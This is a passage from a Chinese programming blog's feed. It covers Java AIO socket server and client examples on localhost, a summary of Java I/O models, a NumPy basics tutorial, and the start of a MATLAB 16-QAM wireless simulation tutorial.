aria-hidden="true">CompletionHandler接口定义</figcaption></figure><p>可以看到，该接口声明了两个方法分别对应IO操作<strong>成功</strong>和<strong>失败</strong>两种情况，并传入IO操作的结果或异常至我们的回调函数中进行进一步的处理。</p><h4 id="服务端-1">服务端</h4><p>下面我们就看一下使用AIO如何编写服务端和客户端。大体来说，与BIO编写方式类似，但是我们可以通过回调的方式实现异步操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.AsynchronousServerSocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.AsynchronousSocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.CompletionHandler;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/06</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AIOTCPServer</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 异步监听socket，在静态代码块中初始化</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">AsynchronousServerSocketChannel</span> <span class="variable">serverSocketChannel</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            serverSocketChannel = AsynchronousServerSocketChannel.open();</span><br><span class="line">            serverSocketChannel.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">6666</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.err.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取数据的回调函数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> CompletionHandler&lt;Integer, ByteBuffer&gt; READ_HANDLER = <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Integer, ByteBuffer&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer result, ByteBuffer readResultBuffer)</span> &#123;</span><br><span class="line">            <span class="comment">// 数据读取完成（这里注意，不需要我们去read操作，操作系统已经帮我们把数据拷贝到用户空间了，即readResultBuffer变量中</span></span><br><span class="line">            readResultBuffer.flip();</span><br><span class="line">            <span class="type">String</span> <span class="variable">rawData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(readResultBuffer.array()).trim();</span><br><span class="line">            System.out.println(LocalDateTime.now() + <span class="string">&quot; - &quot;</span> + Thread.currentThread().getName() +</span><br><span class="line">                    <span class="string">&quot; - ## 接收数据：&quot;</span> + rawData + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, ByteBuffer attachment)</span> &#123;</span><br><span class="line">            exc.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 接收请求的回调函数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> CompletionHandler&lt;AsynchronousSocketChannel, Void&gt; ACCEPT_HANDLER =</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;AsynchronousSocketChannel, Void&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(AsynchronousSocketChannel channel, Void obj)</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        System.out.println(LocalDateTime.now() + <span class="string">&quot; - &quot;</span> +  Thread.currentThread().getName() +</span><br><span class="line">                                <span class="string">&quot; - ## 客户端连接成功：&quot;</span> + channel.getRemoteAddress() + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">                        <span class="comment">// 异步读取数据，立即返回不阻塞</span></span><br><span class="line">                        <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">100</span>);</span><br><span class="line">                        channel.read(buffer, buffer, READ_HANDLER);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 再次接受其他的客户端链接</span></span><br><span class="line">                        serverSocketChannel.accept(<span class="literal">null</span>, <span class="built_in">this</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, Void obj)</span> &#123;</span><br><span class="line">                    System.err.println(<span class="string">&quot;连接客户端失败！err: &quot;</span> + exc);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;端口绑定完成，等待连接......&quot;</span>);</span><br><span class="line">        <span class="comment">// 等待连接，立即返回，不阻塞</span></span><br><span class="line">        serverSocketChannel.accept(<span class="literal">null</span>, ACCEPT_HANDLER);</span><br><span class="line">        <span class="comment">// 验证异步</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">500</span>);</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;闲的一匹&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的代码中，static静态代码块以及main函数处我们写了简单的逻辑，即初始化socket、绑定端口等等。</p><p>需要注意的是，从<code>accept</code>函数开始我们的使用方法就有区别了。在开头我定义了两个常量（ps：实际开发肯定不这么干，肯定是写类）<code>READ_HANDLER</code>和<code>ACCEPT_HANDLER</code>，一个是<strong>接收到连接</strong>时的回调函数，另一个是<strong>读取数据完成时</strong>的回调函数。二者均实现了前面提到的<code>CompletionHandler</code>接口，分别定义了complete和failed函数的内容。</p><p>而这两个回调函数也正是我们实现异步操作的核心了，当JVM后台线程池accept、read操作后，就会对应地、执行我们的回调函数。这就对应了我们前面理论部分中提到的：<strong>操作完成时（如accept完成、读取完成、写入完成等）由操作系统通知我们，而不是我们主动阻塞等待。</strong></p><h4 id="客户端-1">客户端</h4><p>对应的实现客户端代码如下。同上，我们需要定义一个<code>connect</code>函数的回调函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.AsynchronousSocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.CompletionHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CountDownLatch;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/06</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AIOTCPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">AsynchronousSocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> AsynchronousSocketChannel.open()) &#123;</span><br><span class="line">            <span class="type">InetSocketAddress</span> <span class="variable">remote</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6666</span>);</span><br><span class="line">            <span class="comment">// 用于计数，避免客户端退出</span></span><br><span class="line">            <span class="type">CountDownLatch</span> <span class="variable">end</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">            socketChannel.connect(remote, buffer, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Void, ByteBuffer&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Void result, ByteBuffer channel)</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;客户端连接成功&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;this is a simple test.&quot;</span>;</span><br><span class="line">                        channel.put(msg.getBytes());</span><br><span class="line">                        channel.flip();</span><br><span class="line">                        socketChannel.write(channel);</span><br><span class="line">                        System.out.println(<span class="string">&quot;发送数据: &quot;</span> + msg);</span><br><span class="line">                        socketChannel.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        end.countDown();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, ByteBuffer attachment)</span> &#123;</span><br><span class="line">                    exc.printStackTrace();</span><br><span class="line">                    end.countDown();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 等待直到连接关闭</span></span><br><span class="line">            end.await();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行结果-3">运行结果</h3><p>运行结果有几个意思的点，结合理论，重点强调一下加深印象。</p><figure><img src="/img/Java网络编程模型Review/image-20230107012042473.png"alt="AIO运行结果" /><figcaption aria-hidden="true">AIO运行结果</figcaption></figure><ul><li><p>可以看到，能打印出<code>闲的一批</code>就已经说明<code>accept</code>不阻塞了，并没有"卡"在accpet那里使得main线程挂起。</p></li><li><p>观察一下，在<code>accept</code>和<code>read</code>操作的回调函数中，是谁在执行操作？从图中可以看到<code>Thread-x</code>的名字。那就说明，是从属于JVM默认线程池中的线程来做的，这和理论保持一致。</p></li></ul><h2 id="小结">小结</h2><p>看完基本的三种IO模型后，一个很自然而然的问题就是，我们应当在什么场景下使用呢？</p><ul><li>BIO：BIO方式适用于连接数量少且固定的场景，这种方式对服务器资源要求比较高，JDK1.4之前唯一的选择，程序直观简单易理解。</li><li>NIO：适用于连接数目多且业务比较轻。JDK1.4开始支持。</li><li>AIO：适用于连接数目多且连接比较长(业务重操作)，需要操作系统充分参与并发操作。JDK1.7开始支持。</li></ul><p>如果说你的服务器资源充足、且客户端数量少，那BIO就可以了，这是足够且最简单的方法。</p><p>而如果连接数比较多了，比如10万个连接，就算是多线程+BIO也没法处理（线程切换开销、线程池资源有限）。这时候就可以考虑使用利用<code>selector</code>机制的NIO。值得一提的是，你如果自己用JDK原生的NIO类去写代码，说实话蛮麻烦的，我前面那个都是小儿科了，正儿八经的需要熟悉<strong>Reactor模式</strong>（单一线程监听连接、多线程处理不同连接），如select后的包装成FutureTask扔给线程池，那你还得懂多线程编程、并发注意事项等等。</p><p><strong>Netty是一个封装了JavaNIO的API的框架，比如Hadoop的RPC框架就是基于Netty实现的，</strong>直接用Netty去实现NIO相较于你自己从头搞要好很多（当然，了解原理是很重要的）。而AIO，当你需要异步需求的时候可以使用。</p><h1 id="总结">总结</h1><p>总结一下，本篇复习了以下内容：</p><ul><li>关于Socket</li><li>Java中如何使用基本的socket实现基本同步阻塞的TCP、UDP编程</li><li>Java中的三种IO模型(BIO、NIO、AIO)、使用方法及其应用场景。</li></ul><h1 id="参考文献">参考文献</h1><ul><li>《网络编程使用教程（第2版）》——叶树华</li><li>《操作系统概念》——亚伯拉罕·西尔伯沙茨</li><li>《Java核心技术 卷I 开发基础（第12版）》——凯·S.霍斯特曼</li><li>《Java网络编程进阶——从BIO到RPC》——肖川</li><li><ahref="https://www.cnblogs.com/binbingg/p/15208296.html#scroller-10">【转】Java网络编程模型- Binge-和时间做朋友 - 博客园 (cnblogs.com)</a>****</li></ul><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;失踪人口回归...，2022年几乎没怎么好好写博客，一方面原因是因为科研，另一方面...懒了懒了我错了。年底中招奥密克戎，最近也是才缓过劲来，真是坎坷的一年。本科之前其实接触过C语言的网络编程，带课的李金库老师讲的很好，记得当时特别地对I/O多路复用(select)留下了&lt;a
href=&quot;https://github.com/lzwgiter/MyCWebStudy&quot;&gt;很深的印象&lt;/a&gt;。今天复习一下Java中网络编程的相关理论和代码，包括最基础的Sokcet使用以及三种I/O模型。（ps：&lt;strong&gt;我gitee的博客由于部分文章没法过审核，因此gitee博客以后可能就不会更新了，我仍然使用github博客为主。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/Java网络编程模型Review/db04ec35da1f9962545649576098426a.jpeg&quot; alt=&quot;db04ec35da1f9962545649576098426a&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java" scheme="https://lzwgiter.github.io/tags/Java/"/>
    
    <category term="网络编程" scheme="https://lzwgiter.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>python-Numpy库使用</title>
    <link href="https://lzwgiter.github.io/posts/203767b8.html"/>
    <id>https://lzwgiter.github.io/posts/203767b8.html</id>
    <published>2022-04-26T12:07:51.000Z</published>
    <updated>2023-01-02T07:21:40.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>学习一下Numpy库的使用，该库在机器学习领域有不小的用处，可以高效的进行向量、矩阵等之间的运算操作。最近在学习强化学习的部分，代码实现刚好有用到。</p></blockquote><span id="more"></span><h1 id="基础部分">基础部分</h1><h2 id="安装">安装</h2><p>安装非常简单，使用pip命令就可以了：</p><blockquote><p>pip install numpy</p></blockquote><h2 id="简单使用和基本概念">简单使用和基本概念</h2><p>Numpy中主要的对象都是<strong>同构(homogeneous)</strong>的<strong>多维(multidimensional)</strong>数组，可以理解为一个如下的表格：<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| 序号  | 年龄  |  成绩  |</span><br><span class="line">|  1   |  18   |  100  |</span><br><span class="line">|  2   |  20   |  98   |</span><br></pre></td></tr></table></figure></p><p>除去表头外，可以看到数据都是同质的，即这里都是<strong>数字</strong>(通常为number)。上述的数据我们可以用一个多维列表表示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="number">1.</span>, <span class="number">18.</span>, <span class="number">100.</span>],</span><br><span class="line"> [<span class="number">2.</span>, <span class="number">20.</span>, <span class="number">98.</span>]]</span><br></pre></td></tr></table></figure><p>Numpy中通常将维度<code>dimension</code>称为<code>axis</code>(n.轴，轴线)，如上面这个数据，他的轴(维度)就是2，及两个axes，其中每一个axis长度为3。像上面这种<code>array</code>在Numpy中就叫<code>ndarray</code>，这和python自带的那个<code>array.array</code>是不一样的，后者只是一维的。官网描述如下：</p><blockquote><p>In NumPy dimensions are called axes.</p></blockquote><p>即维度称作<strong>轴</strong>，最简单的理解方式就是，我们学过的一维坐标系、二维坐标系、三维坐标系，这里的维实际上就是轴，你问我什么轴？那就是x、y、z了。所以我们也可以说一维坐标系就只有一个轴，二维有两个轴。</p><p>下面我们用命令行创建一个<code>ndarray</code>的对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo = np.arange(<span class="number">15</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(demo)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;numpy.ndarray&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo</span><br><span class="line">array([ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>])</span><br></pre></td></tr></table></figure><p>上面的<code>arange</code>函数用来生成指定范围内，指定step的均匀的数据。通该函数我们就得到了一个<code>numpy.ndarray</code>的对象，函数定义：</p><blockquote><p>arange(...) arange([start,] stop[, step,], dtype=None, *,like=None)</p><p>​ Return evenly spaced values within a given interval.</p></blockquote><p>我们使用<code>reshap</code>函数将他变为一个指定行和列的向量组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.reshape(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>],</span><br><span class="line">       [ <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>],</span><br><span class="line">       [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>]])</span><br></pre></td></tr></table></figure><p><code>reshape</code>函数实现修改向量的维度，这样我们就将数据修改为了二维的了，他有两个轴，长度分别为3和5（不理解这两个数字可以往下看）。定义如下：</p><blockquote><p>reshape(a, newshape, order='C') Gives a new shape to an array withoutchanging its data.</p></blockquote><p>对于一个<code>ndarray</code>对象，几个比较关键的属性如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ndim 数组的维度数量，也叫做轴axis的数量</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.ndim **注意下这里**</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="comment"># shape 数组的维度，等价于各个轴的长度，等价于秩的值</span></span><br><span class="line"><span class="comment"># 第一位代表轴0的长度，第二位代表轴1的长度，第三位代表轴3的长度</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.shape</span><br><span class="line">(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line"><span class="comment"># size 包含元素总数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.size</span><br><span class="line"><span class="number">15</span></span><br><span class="line"><span class="comment"># itemsize 元素大小</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.itemsize</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="comment"># dtype 数据类型，既可以为Python标准类型，也可以是numpy.int32、numpy.int16、numpy.float64</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.dtype</span><br><span class="line">dtype(<span class="string">&#x27;int32&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.dtype.name</span><br><span class="line"><span class="string">&#x27;int32&#x27;</span></span><br></pre></td></tr></table></figure><p>读到这里你可能会和我一样疑惑（没有最好...），哎，<code>demo</code>不是一个3×5的向量组吗？为什么维度是2？为什么不是3？不是5？请把这个3×5的向量组理解为一个3×5的表格，那么这个表格是几维的呢？或者说几个轴呢？答案显然是2了，且两个轴的长度分别为3和5。如果还不能充分理解，请看<ahref="https://blog.csdn.net/Babyfatliang/article/details/87721282">下图</a>：</p><p><img src="/img/python-Numpy库使用/image-20220426205627110.png" /></p><h1 id="参考学习">参考学习</h1><p><ahref="https://numpy.org/doc/stable/user/absolute_beginners.html">NumPy:the absolute basics for beginners — NumPy v1.22 Manual</a></p><p><ahref="https://blog.csdn.net/Babyfatliang/article/details/87721282">【Python模块学习】NumPy中的维度(dimension)、轴(axis)、秩(rank)的含义_Babyfatliang的博客-CSDN博客_python维度</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;学习一下Numpy库的使用，该库在机器学习领域有不小的用处，可以高效的进行向量、矩阵等之间的运算操作。最近在学习强化学习的部分，代码实现刚好有用到。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="python" scheme="https://lzwgiter.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>MATLAB - Wireless Communication Onramp</title>
    <link href="https://lzwgiter.github.io/posts/f06096b.html"/>
    <id>https://lzwgiter.github.io/posts/f06096b.html</id>
    <published>2022-01-20T10:08:41.000Z</published>
    <updated>2023-01-02T07:18:20.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>失踪人口回归嘿嘿。最近出于实验需求，学习一下如何使用Matlab来模拟无线通信环境，包括通过添加噪声、过滤器等来模拟真实物理世界状态，旨在测试信道的误比特率。包括单链路和多链路的模拟。记录的内容主要来自官网MathWork上的在线免费课程。包括：</p><ol type="1"><li>单理想通道&amp;噪声通道通信模拟</li><li>多径理想&amp;噪声模拟，OFDM机制模拟</li></ol><p>(ps：之前一直认为Matlab没啥用&amp;&amp;没好好学的我对不起对不起对不起。</p><p><imgsrc="/img/MATLAB%20-%20Wireless%20Communication%20Onramp/image-20220122214915003.png" /></p></blockquote><span id="more"></span><h2 id="模拟基本数字通信链路">模拟基本数字通信链路</h2><h3 id="模拟发送方和接收方">模拟发送方和接收方</h3><p><imgsrc="https://matlabacademy-content.mathworks.com/4.35.1/R2021b/content/Communications/Basic%20Link%20Simulation/Modulation%20and%20Demodulation/images/diagram1_backtobackQAMlink-01.svg" /></p><p>要模拟的过程如上图所示，这里使用16-QAM进行调制和解调，如下是代码和步骤。</p><p>首先第一步我们需要一个信源，即产生信号的源，这里即是由一系列的0,1比特串组成，在matlab中其实就是一个向量。所以我们可以使用<code>randi</code>函数来实现该功能。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 创建一个信源，使用randi %</span></span><br><span class="line">srcBits = randi([<span class="number">0</span>, <span class="number">1</span>], <span class="number">20000</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 使用16-QAM进行调制和解调 %</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">modOut = qammod(srcBits, modOrder, <span class="string">&quot;InputType&quot;</span>, <span class="string">&quot;bit&quot;</span>);</span><br><span class="line"><span class="comment">% 查看星座图 %</span></span><br><span class="line">scatterplot(modOut);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 这里的信道假设是理想信道 %</span></span><br><span class="line">chanOut = modOut;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 解调 %</span></span><br><span class="line">demodOut = qamdemod(chanOut, modOrder, <span class="string">&quot;OutputType&quot;</span>, <span class="string">&quot;bit&quot;</span>);</span><br><span class="line"><span class="comment">% 检查 %</span></span><br><span class="line">check = <span class="built_in">isequal</span>(srcBits, 